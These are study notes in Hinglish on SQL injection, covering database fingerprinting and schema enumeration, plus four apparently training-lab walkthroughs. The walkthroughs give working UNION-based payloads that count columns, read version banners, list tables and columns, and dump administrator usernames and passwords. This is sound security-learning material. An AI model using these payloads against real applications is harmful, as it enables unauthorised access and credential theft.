SQLi Bug Hunting Notes(Examining all the Databases).
Big picture:
SQL injection sirf data nikalna nahi hota.
Pehla kaam hota hai database ko samajhna:
 Kaunsa database hai? (MySQL, Oracle, SQL Server…)
 Uske andar kaun‑kaun si tables hain?
Un tables mein kaun‑kaun se columns hain?
Jab yeh pata chal jata hai → data nikalna easy ho jata hai.
Part 1: Database type & version find karna: (Kyun zaroori hai?)
Har database ka:
Syntax alag hota hai
Functions alag hotay hain.
Agar tumhein DB type pata na ho:
Payload galat ho sakta hai
Injection fail ho jata hai
🧠 Idea : 
Tum database‑specific query inject karte ho
Jo query chal jaaye → wahi database hai.
🔎 Common database version queries:
MySQL / SQL Server =======> SELECT @@version
PostgreSQL =============> SELECT version()
Oracle ================>  SELECT * FROM v$version

UNION ke sath example:
Assume:
1 string column available.
' UNION SELECT @@version--
Agar response mein yeh aaye:
Microsoft SQL Server 2016 (SP2) ...
➡️ Ab confirm:
Database = SQL Server
Version bhi pata chal gaya.
One-line takeaway:
Jo version query chal jaye = wahi database
Part 2: Database ke andar kya hai?
Tumhein nahi pata hota:
users table ka naam kya hai
passwords kis table mein hain
Is liye pehle tables list karte hain.
information_schema:
Most databases (MySQL, PostgreSQL, SQL Server) ke paas:
information_schema hota hai
Yeh database ka index / catalog hota hai
🔍 Tables list karna:
SELECT * FROM information_schema.tables
OUTPUT EXAMPLE:
Products
Users
Feedback
➡️ Ab pata chal gaya:
Users naam ki table exist karti hai ✅.
Part 3: Table ke columns dekhna
Ab tum sochte ho:
Users table mein kya‑kya fields hain?
🔍 Columns list karna:
SELECT * FROM information_schema.columns 
WHERE table_name = 'Users'
Output:
UserId
Username
Password
➡️ Jackpot 🎯: 
Ab tumhein exact pata hai:
Kis column mein username hai
Kis mein password hai.
 Flow samajh lo (very important):
Database type → Tables → Columns → Real data
Part 4: Oracle database ka special case
Oracle thora different hai ❗
Oracle mein information_schema nahi hota.
Oracle tables list:
SELECT * FROM all_tables
Oracle columns list:
SELECT * FROM all_tab_columns 
WHERE table_name = 'USERS'

Oracle mein:
Table names usually UPPERCASE hotay hain.

🧠 Final mental model (remember this):
SQL injection ek blind guess nahi hota
Database khud tumhein apna map deta hai.
<<<<<<<<--------------------------------------------------------->>>>>>>>>

LAB01: Break Down
SQL injection attack, querying the database type and version on Oracle:


SQL Injection--  Product Category Filter
End Goal: Display the database versions and string


Analysis:
' => Internal server error

Tasks:
 (1) : Determine the number of columns 
' order by 1--
' order by 2--
so 2 is true there are 2 columns.

 (2): Determine the datatype of the columns.
' UNION SELECT 'a', 'a'--
So both of them are the strings 

Will get error just because of database sytax issue 

Missing things are:
1. FROM
2. Dummy table name for the table which is DUAL

So the command will be :
' UNION SELECT 'a', 'a' FROM DUAL--


 (3): Output the version of database

For Oracle database:
SELECT banner from v$version


So the Final command will be :
' UNION SELECT banner, NULL from v$version--

LAB02: Break Down

Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft.


SQL Injection - Product Category

END Goal - Display the database version 

Analysis:

(1): Find Number of columns.

' ORDER by 1#
' ORDER by 2#
On 3rd it gives 500 error => Which means there are 2 columns 


(2): Find the datatype of the columns

' UNION SELECT 'a', NULL#
' UNION SELECT 'a', 'a'#

(3): Output the version:

For Microsoft:
SELECT @@version

' UNION SELECT @@version, NULL#


Lab03: Break-Down 
Lab: SQL injection attack, listing the database contents on non-Oracle databases.


SQL injection vulnerability in the product category filter.

END GOALS:

- Determine the table that contains usernames and passwords
- Determine the relevant columns
- Output the content of the table
- Login as the administrator user.


Analysis:

1: Find the number of columns
' ORDER by 1-- => 200 OK
' ORDER by 2-- => 200 OK
' ORDER by 3-- => 500 error

Means there are 2 columns 

2: Find out the Datatypes:

' UNION SELECT 'a', 'a'--  => 200 OK
Both columns are string.

3: Version of the Database:

Non-Oracle means that it can be:
.Microsoft
.PostgreSQL
.MySQL


And this one is PostgreSQL:
' UNION SELECT version(), NULL-- =>PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4).



4. Output the list of table names in the database:

To get names of tables the query use is:
SELECT * FROM information_schema.tables


So the command will be :
' UNION SELECT table_name, NULL from information_schema.tables--

Table name which i got for users=> users_sifmbs


5: output the column name of the table.


Command for that :

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users_sifmbs'--


username_skeqyu

password_dlbfms


6: output the usernames and password.

' UNION SELECT username_skeqyu, password_dlbfms FROM users_sifmbs--
=> 200 OK

administrator
rfn2lflm3td7f31bahvx



Lab04: Break DOWN

Lab: SQL injection attack, listing the database contents on Oracle.


END Goal:
- Determine which table contains the usernames and passwords.
- Determine the column name in table
- output the content of the table
- Login as the administrator user.

1) Determine the number of columns.
' ORDER BY 1--
' ORDER BY 2--

2 columns 

2) Find out the Datatypes:

' UNION SELECT 'a', 'a' FROM DUAL--
Both are strings

- Oracle Database.
- Both accept strings

3) Output the list of tables in the database:

' UNION SELECT table_name, NULL FROM all_tables--


USERS_PEFQZA


4) Output the column names of the users table

' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_PEFQZA'--


USERNAME_CNRDOS
PASSWORD_LCAHFX


5) Output the list of usernames/passwords

'UNION select USERNAME_CNRDOS, PASSWORD_LCAHFX FROM USERS_PEFQZA--


administrator

ho5pxtom5h0i6w82pw9t

